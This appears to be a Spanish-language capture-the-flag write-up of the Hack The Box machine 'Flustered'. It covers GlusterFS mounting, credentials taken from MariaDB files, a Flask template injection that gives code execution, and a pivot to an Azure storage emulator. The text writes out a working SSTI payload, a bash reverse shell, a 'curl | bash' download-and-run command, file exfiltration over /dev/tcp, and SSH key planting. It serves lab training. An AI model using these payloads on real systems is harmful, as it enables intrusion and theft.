---
layout: post
title: Flustered
date: 2023-03-12
description:
img:
fig-caption:
tags: [OSCP, eWPT, eWPTXv2, eCPPTv2]
---
___

<center><img src="/writeups/assets/img/Flustered-htb/Flustered.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de Squid Proxy

* Abuso de GlusterFS

* Information Disclosure

* SSTI

* Abuso de Azure Storage

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.131 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 08:29 GMT
Nmap scan report for 10.10.11.131
Host is up (0.071s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
3128/tcp  open  squid-http
24007/tcp open  unknown
49152/tcp open  unknown
49153/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,111,3128,24007,49152,49153 10.10.11.131 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 08:30 GMT
Nmap scan report for 10.10.11.131
Host is up (0.22s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9331fc38ff2fa7fd89a348bfed6b97cb (RSA)
|   256 e5f8274c384059e056e739986b86d73a (ECDSA)
|_  256 626dab81fcd2f7a1c19d39ccf27aa16a (ED25519)
80/tcp    open  http        nginx 1.14.2
|_http-title: steampunk-era.htb - Coming Soon
|_http-server-header: nginx/1.14.2
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.6
24007/tcp open  rpcbind
49152/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=flustered.htb
| Not valid before: 2021-11-25T15:27:31
|_Not valid after:  2089-12-13T15:27:31
49153/tcp open  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.41 seconds
```

Añado el dominio ```flustered.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.131
http://10.10.11.131 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.11.131], Title[steampunk-era.htb - Coming Soon], nginx[1.14.2]
```

Añado el dominio ```steampunk-era.htb``` al ```/etc/hosts```

No encuentro rutas ni subdominios, así que paso a otro puerto

## Puerto 3128 (HTTP-PROXY)

Añado una configuración el ```BurpSuite``` para poder pasar por el Squid Proxy

<img src="/writeups/assets/img/Flustered-htb/1.png" alt="">

## Puerto 49192 (HTTPS)

Necesito autenticarme por el SQUID Proxy para poder conectarme

<img src="/writeups/assets/img/Flustered-htb/2.png" alt="">

Al intentar pasar a través del puerto 80, me redirige al puerto 8080 interno

<img src="/writeups/assets/img/Flustered-htb/3.png" alt="">

## Puerto 24007 (GlusterFS)

Listo los volúmenes con ```gluster```

```null
apt install glusterfs-server
apt install vglusterfs-cli
```

```null
gluster --remote-host=10.10.11.131 volume list
vol1
vol2
```

Creo una montura en mi equipo. Pero recibo un error

```null
mount -t glusterfs 10.10.11.131:/vol1 /mnt/vol1
Mount failed. Check the log file  for more details.
```

Listo los logs para ver lo ocurrido

```null
cat /var/log/glusterfs/mnt-vol1.log | grep error -A 1
[2023-03-12 09:37:51.120239 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:80000002:system library::No such file or directory
[2023-03-12 09:37:51.120264 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:10080002:BIO routines::system lib
[2023-03-12 09:37:51.120285 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:0A080002:SSL routines::system lib
[2023-03-12 09:37:51.120439 +0000] I [MSGID: 114020] [client.c:2336:notify] 0-vol1-client-0: parent translators are ready, attempting connect on transport [] 
[2023-03-12 09:37:52.142849 +0000] E [MSGID: 101075] [common-utils.c:519:gf_resolve_ip6] 0-resolver: error in getaddrinfo [{family=2}, {ret=No address associated with hostname}] 
[2023-03-12 09:37:52.142927 +0000] E [name.c:267:af_inet_client_get_remote_sockaddr] 0-vol1-client-0: DNS resolution failed on host flustered
```

No puede resolver a ```flustered```, así que lo agrego al ```/etc/hosts```. Pero ahora tengo otro error

```null
cat /var/log/glusterfs/mnt-vol1.log | grep error -A 3 -B 3
[2023-03-12 09:45:46.490264 +0000] I [io-stats.c:3701:ios_sample_buf_size_configure] 0-vol1: Configure ios_sample_buf  size is 1024 because ios_sample_interval is 0
[2023-03-12 09:45:46.490996 +0000] I [socket.c:4287:ssl_setup_connection_params] 0-vol1-client-0: SSL support for MGMT is NOT enabled IO path is ENABLED certificate depth is 1 for peer 
[2023-03-12 09:45:46.494608 +0000] E [socket.c:4405:ssl_setup_connection_params] 0-vol1-client-0: could not load our cert at /usr/lib/ssl/glusterfs.pem
[2023-03-12 09:45:46.494637 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:80000002:system library::No such file or directory
[2023-03-12 09:45:46.494659 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:10080002:BIO routines::system lib
[2023-03-12 09:45:46.494679 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:0A080002:SSL routines::system lib
[2023-03-12 09:45:46.494775 +0000] I [MSGID: 114020] [client.c:2336:notify] 0-vol1-client-0: parent translators are ready, attempting connect on transport [] 
Final graph:
+------------------------------------------------------------------------------+
--
[2023-03-12 09:45:46.823982 +0000] I [socket.c:833:__socket_shutdown] 0-vol1-client-0: intentional socket shutdown(12)
[2023-03-12 09:45:46.950858 +0000] I [socket.c:4287:ssl_setup_connection_params] 0-vol1-client-0: SSL support for MGMT is NOT enabled IO path is ENABLED certificate depth is 1 for peer 10.10.11.131:24007
[2023-03-12 09:45:46.951687 +0000] E [socket.c:4405:ssl_setup_connection_params] 0-vol1-client-0: could not load our cert at /usr/lib/ssl/glusterfs.pem
[2023-03-12 09:45:46.951720 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:80000002:system library::No such file or directory
[2023-03-12 09:45:46.951752 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:10080002:BIO routines::system lib
[2023-03-12 09:45:46.951776 +0000] E [socket.c:224:ssl_dump_error_stack] 0-vol1-client-0:   error:0A080002:SSL routines::system lib
[2023-03-12 09:45:46.955793 +0000] I [fuse-bridge.c:5294:fuse_init] 0-glusterfs-fuse: FUSE inited with protocol versions: glusterfs 7.24 kernel 7.37
[2023-03-12 09:45:46.955822 +0000] I [fuse-bridge.c:5926:fuse_graph_sync] 0-fuse: switched to graph 0
[2023-03-12 09:45:46.956415 +0000] E [fuse-bridge.c:5364:fuse_first_lookup] 0-fuse: first lookup on root failed (Transport endpoint is not connected)
```

Está esperando un certificado SSL, así que por ahora no puedo hacer nada. Sin embargo, para el volumen 2 no lo pide

```null
mount -t glusterfs 10.10.11.131:/vol2 /mnt/vol2
```

Puedo listar varios archivos

```null
ls
aria_log.00000001  aria_log_control  debian-10.3.flag  ib_buffer_pool  ibdata1	ib_logfile0  ib_logfile1  ibtmp1  multi-master.info  mysql  mysql_upgrade_info	performance_schema  squid  tc.log
```

Corresponde a una base de datos ```MySQL```. Dentro del directorio ```squid```, listo las cadenas de caracteres imprimibles de los archivos con contraseñas

```null
strings passwd.*
PRIMARY
InnoDB
user
password
enabled
fullname
comment
infimum
supremum
lance.friedman
o>WJ5-jD<5^m3
Lance Friedman
```

Obtengo credenciales: ```lance.friedman:o>WJ5-jD<5^m3```

Para poder listar más información, lo que puedo hacer es crear un contenedor para instalar la versión de ```MySQL``` en concreto y conectarme como si fuera creada por mí

```null
strings mysql_upgrade_info
10.3.31-MariaDB
```

```null
docker run --name flustered -v $(pwd):/var/lib/mysql -d mariadb:10.3.31
```

Compruebo que se haya creado y me conecto con una bash
```null
docker ps
CONTAINER ID   IMAGE             COMMAND                  CREATED              STATUS              PORTS      NAMES
f3258fd2c889   mariadb:10.3.31   "docker-entrypoint.s…"   About a minute ago   Up About a minute   3306/tcp   flustered
```

```null
docker exec -it f3258fd2c889 bash
root@f3258fd2c889:/#
```

No detecta un plugin

```null
root@f3258fd2c889:/# mysql -uroot
ERROR 1524 (HY000): Plugin 'unix_socket' is not loaded
```

Esto es porque falta un archivo de configuración

```null
root@54cce7ef5199:/# echo -e '[mariadb]\nplugin-load-add = auth_socket.so' > /etc/mysql/mariadb.conf.d/socket.cnf
```

Reinicio el contenedor

```null
docker stop 54cce7ef5199
```

```null
docker start 54cce7ef5199
```

Ahora puedo acceder sin problema

```null
cker exec -it 54cce7ef5199 bash
root@54cce7ef5199:/# mysql -uroot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.3.31-MariaDB-1:10.3.31+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

De la base de datos squid, puedo obtener la contraseña que vi en las cadenas de caracteres imprimibles

```null
MariaDB [squid]> select user,password from passwd;
+----------------+---------------+
| user           | password      |
+----------------+---------------+
| lance.friedman | o>WJ5-jD<5^m3 |
+----------------+---------------+
1 row in set (0.001 sec)
```

Aplico fuzzing para descubrir rutas

```null
gobuster dir --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' -u http://127.0.0.1 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
Error: error on creating gobusterdir: proxy URL is invalid (parse "http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128": net/url: invalid userinfo)
```

Para solucionar el error de autenticación, basta con poner en urlencode los caracteres especiales

```null
gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128' -u http://127.0.0.1 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/13 10:38:23 Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 301) [Size: 185] [--> http://127.0.0.1/app/]
```

Dentro de ```/app``` busco por extensiones ```.py```

```null
gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128' -u 'http://127.0.0.1/app' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x py
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1/app
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              py
[+] Timeout:                 10s
===============================================================
2023/03/13 10:41:16 Starting gobuster in directory enumeration mode
===============================================================
/templates            (Status: 301) [Size: 185] [--> http://127.0.0.1/app/templates/]
/static               (Status: 301) [Size: 185] [--> http://127.0.0.1/app/static/]   
/app.py               (Status: 200) [Size: 748]                                      
/config               (Status: 301) [Size: 185] [--> http://127.0.0.1/app/config/]   
```

Intento traer el ```app.py```

```null
curl -s -X GET 'http://127.0.0.1/app/app.py' --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128'
from flask import Flask, render_template_string, url_for, json, request
app = Flask(__name__)

def getsiteurl(config):
  if config and "siteurl" in config:
    return config["siteurl"]
  else:
    return "steampunk-era.htb"

@app.route("/", methods=['GET', 'POST'])
def index_page():
  # Will replace this with a proper file when the site is ready
  config = request.json

  template = f'''
    <html>
    <head>
    <title>{getsiteurl(config)} - Coming Soon</title>
    </head>
    <body style="background-image: url('{url_for('static', filename='steampunk-3006650_1280.webp')}');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
  '''
  return render_template_string(template)

if __name__ == "__main__":
  app.run()
```

Está comprobando si se le está pasando como parámetro ```siteurl```

```null
curl -s -X POST 'http://10.10.11.131' -H "Content-type: application/json" -d '{"siteurl":"test"}'

    <html>
    <head>
    <title>test - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
```

Mi input se imprime como output, por lo que puedo intentar un SSTI

{%raw%}
```null
curl -s -X POST 'http://10.10.11.131' -H "Content-type: application/json" -d '{"siteurl":"{{3*3}}"}' | grep title
    <title>9 - Coming Soon</title>
```
{%endraw%}
Obtengo RCE con este payload:

{%raw%}
```null
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{%endraw%}

<img src="/writeups/assets/img/Flustered-htb/4.png" alt="">

Me comparto un archivo ```index.html``` que se encargue de enviarme una reverse shell

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.9/443 0>&1'
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.131 - - [13/Mar/2023 11:08:15] "GET / HTTP/1.1" 200 -
```


Envío el payload

{%raw%}
```null
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.16.9 | bash').read() }}
```
{%endraw%}

Recibo la shell en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.131] 36754
bash: cannot set terminal process group (666): Inappropriate ioctl for device
bash: no job control in this shell
www-data@flustered:~/html/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@flustered:~/html/app$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@flustered:~/html/app$ export TERM=xterm
www-data@flustered:~/html/app$ export SHELL=bash
www-data@flustered:~/html/app$ stty rows 55 columns 209
```

Estoy dentro de la máquina víctima

```null
www-data@flustered:~/html/app$ hostname -I
10.10.11.131 172.17.0.1 dead:beef::250:56ff:feb9:9d10 
```

En el directorio ```/var/backups``` hay una clave cuyo grupo asignado es ```jennifer```

```null
www-data@flustered:/$ find \-group jennifer 2>/dev/null 
./var/backups/key
./gluster/bricks/brick1/vol1
./home/jennifer
```

```vol1``` corresponde al directorio personal de este usuario

```null
www-data@flustered:/$ df -h
Filesystem       Size  Used Avail Use% Mounted on
udev             2.0G     0  2.0G   0% /dev
tmpfs            395M  5.6M  390M   2% /run
/dev/sda1        3.9G  2.2G  1.7G  57% /
tmpfs            2.0G   12K  2.0G   1% /dev/shm
tmpfs            5.0M     0  5.0M   0% /run/lock
tmpfs            2.0G     0  2.0G   0% /sys/fs/cgroup
localhost:/vol1  3.9G  2.2G  1.7G  57% /home/jennifer
```

Como estoy dentro de la máquina, puedo traerme los certificados que me hacían falta

```null
www-data@flustered:/etc/ssl$ ls
certs  glusterfs.ca  glusterfs.key  glusterfs.pem  openssl.cnf	private
```

Me los transfiero para introducirlos en mi directorio ```/usr/lib/ssl/```

```null
www-data@flustered:/etc/ssl$ cat < glusterfs.ca > /dev/tcp/10.10.16.9/443
www-data@flustered:/etc/ssl$ cat < glusterfs.key > /dev/tcp/10.10.16.9/443
www-data@flustered:/etc/ssl$ cat < glusterfs.pem > /dev/tcp/10.10.16.9/443
```

```null
nc -nlvp 443 > glusterfs.ca
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.131] 36766
nc -nlvp 443 > glusterfs.key
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.131] 36768
nc -nlvp 443 > glusterfs.pem
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.131] 36770
```

Creo la montura

```null
mount -t glusterfs 10.10.11.131:/vol1 /mnt/vol1
```

Puedo ver la primera flag

```null
cat user.txt
3043b573b107b41dafe75ed987f87612
```

Meto mi clave pública en las ```authorized_keys``` para ganar acceso al sistema por SSH

```null
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZeXLXUyQp8rUBP7IE7olxFu8bKnHinZ0WEhCki4Le9GTjfnxiUr/FgI8CVXEdHLzcAwHGbKT1fHFyNo99meT93W7OkbiV+m+zs2WxwgWMyZs5VxeFob8/xbdT2PfOQZHQjOPo0V5c30XpOnhnNcl7VoRA7L/QbzaNE/x7hXT6QbANNlK/cusxNtdUDODe7bWVbfS0v/JZ/gH+G1SZkUOiQQmpjEWuFEAHICOJ2kKtsCPTBuRRUdNu2tBi9Pn67lFYvwD/CBdB7KIrEoGmQqXe7d7OB2xd79YCPIUi0cJ105/v4h0LfvQdkRhAr/2eAaZWfDPaWMqnP2wqbKvu0Zd/bAQufbiChboiSeYsY4XGmK3cM6sFzb3Go2FS9wYTjS2Ouls6MPmuQEFkSoTH/5neKelZvO/Z9mnfsk64i+m0Q6BZ94OTghaTk/QaVroW+yc+UqWxTXur3E18+AXlBnwEOZJKLmm07mGLj/qa+mISJAPe9s6omPE65Od7vx+PvvU= root@kali' > .ssh/authorized_keys
```

```null
ssh jennifer@10.10.11.131
Linux flustered 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jennifer@flustered:~$ 
```

# Escalada

Puedo ver la clave que encontré antes

```null
jennifer@flustered:/var/backups$ cat key 
FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==
```

Está en base64, pero no es legible. Como hay contenedores desplegados, busco por IPs activas

```null
jennifer@flustered:/tmp$ ./nmap --open --min-rate 5000 -n -Pn 172.17.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-13 12:26 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00044s latency).
Not shown: 1204 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  sunrpc

Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 1206 closed ports
PORT      STATE SERVICE
10000/tcp open  webmin
```

El puerto 10000 está abierto en la ```172.17.0.2```. Me lo traigo con un Local Port Forwarding

```null
ssh jennifer@10.10.11.131 -L 10000:172.17.0.2:10000
```

Lo escaneo con ```nmap```

```null
nmap -sCV -p10000 localhost
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 12:36 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000041s latency).

PORT      STATE SERVICE           VERSION
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 500 Internal Server Error
|     Server: Azurite-Blob/3.14.3
|     Date: Mon, 13 Mar 2023 12:36:36 GMT
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 500 Internal Server Error
|     Server: Azurite-Blob/3.14.3
|     Date: Mon, 13 Mar 2023 12:36:28 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 A required CORS header is not present.
|     Server: Azurite-Blob/3.14.3
|     x-ms-error-code: InvalidHeaderValue
|     x-ms-request-id: 2152500f-a801-4ba8-b7f2-3688119ed6b0
|     content-type: application/xml
|     Date: Mon, 13 Mar 2023 12:36:28 GMT
|     Connection: close
|     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
|     <Error>
|     <Code>InvalidHeaderValue</Code>
|     <Message>A required CORS header is not present.
|     RequestId:2152500f-a801-4ba8-b7f2-3688119ed6b0
|     Time:2023-03-13T12:36:28.524Z</Message>
|     <MessageDetails>Invalid required CORS header Origin undefined</MessageDetails>
|_    </Error>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.93%I=7%D=3/13%Time=640F18CD%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,7B,"HTTP/1\.1\x20500\x20Internal\x20Server\x20Error\r\nServer
SF::\x20Azurite-Blob/3\.14\.3\r\nDate:\x20Mon,\x2013\x20Mar\x202023\x2012:
SF:36:28\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,24B,"HTTP/
SF:1\.1\x20400\x20A\x20required\x20CORS\x20header\x20is\x20not\x20present\
SF:.\r\nServer:\x20Azurite-Blob/3\.14\.3\r\nx-ms-error-code:\x20InvalidHea
SF:derValue\r\nx-ms-request-id:\x202152500f-a801-4ba8-b7f2-3688119ed6b0\r\
SF:ncontent-type:\x20application/xml\r\nDate:\x20Mon,\x2013\x20Mar\x202023
SF:\x2012:36:28\x20GMT\r\nConnection:\x20close\r\n\r\n<\?xml\x20version=\"
SF:1\.0\"\x20encoding=\"UTF-8\"\x20standalone=\"yes\"\?>\n<Error>\n\x20\x2
SF:0<Code>InvalidHeaderValue</Code>\n\x20\x20<Message>A\x20required\x20COR
SF:S\x20header\x20is\x20not\x20present\.\nRequestId:2152500f-a801-4ba8-b7f
SF:2-3688119ed6b0\nTime:2023-03-13T12:36:28\.524Z</Message>\n\x20\x20<Mess
SF:ageDetails>Invalid\x20required\x20CORS\x20header\x20Origin\x20undefined
SF:</MessageDetails>\n</Error>")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersion
SF:BindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clo
SF:se\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Termi
SF:nalServerCookie,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(TLSSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(X11Pr
SF:obe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,7B,"HTTP/1\.1\x20500\x20Internal\x20Server\x2
SF:0Error\r\nServer:\x20Azurite-Blob/3\.14\.3\r\nDate:\x20Mon,\x2013\x20Ma
SF:r\x202023\x2012:36:36\x20GMT\r\nConnection:\x20close\r\n\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.50 seconds
```

Devuelve un contenido en XML al tramitar una petición por GET.

```null
curl -s -X GET http://localhost:10000/
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Error>
  <Code>InvalidQueryParameterValue</Code>
  <Message>Value for one of the query parameters specified in the request URI is invalid.
RequestId:7a285c0f-fd5c-4666-984d-3b4aec52f83b
Time:2023-03-13T12:32:37.303Z</Message>
</Error>
```

Este error es típico de ```Azure```

<img src="/writeups/assets/img/Flustered-htb/5.png" alt="">

Instalo el ```Azure Storage Explorer``` en un máquina Windows. Me conecto a la VPN de HackTheBox desde allí. Para poder ganar acceso por SSH, voy a añadir la clave pública de esta otra máquina a las authorized_keys

```null
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtAyIrKiliOVhNMYk40PX9R+IaxnAA/6BHUJFcKBlt8fRsN2Q/lmjJUl2BiEXQlOCI2HVDvwRSlzaO73UnPtlIV3FdsnMeYywNdgBkbksTBIauFiYMPnt+6mJ3SMBB7QEJOo+u4craUapST726O9SGF/PP0RLh8ujqni2wA1S8aLoIC2znYZNm2qqT04BY5VTlllK54zuyk64/YvkKDyZwz6zvQ8DrUg/r6RbYDzOeMBrSxKyI4l8sgLcEjV9Sf2omiIKVhodruotkc07lFhfXao473/Uvmk2P7Q/ms9KqeHEFFYZBBiSCKXQBh17RfYSrAL2xuJbX3S9UEH8vZkKIAa8Zl6i+lD2ShxYolDv6s69MUwZ9fuOdk4RQXTc4X28kpzg4eS2CwrdujfSm8A5tvYBRyReXu91oNiTTfIAGXlKUXcBv9TumgBN9IZEQk9RrTkcIJhtgt8vX20KHOVx6Q7xVMZ7PEFhw+n+DpfEQiFEjNhFSMJPH233M9qOdB90= usuario@DESKTOP-5QVUJUP' >> authorized_keys
```

Y lo mismo para el Local Port Forwarding

```null
PS C:\Users\Usuario\.ssh> ssh jennifer@10.10.11.131 -L 10000:172.17.0.2:10000
```

Añado un nuevo recurso

<img src="/writeups/assets/img/Flustered-htb/6.png" alt="">

Tengo que proporcionar la clave que vi antes

<img src="/writeups/assets/img/Flustered-htb/7.png" alt="">

Puedo ver los recursos desde el explorador

<img src="/writeups/assets/img/Flustered-htb/8.png" alt="">

Dentro hay una ```id_rsa``` para ganar acceso por SSH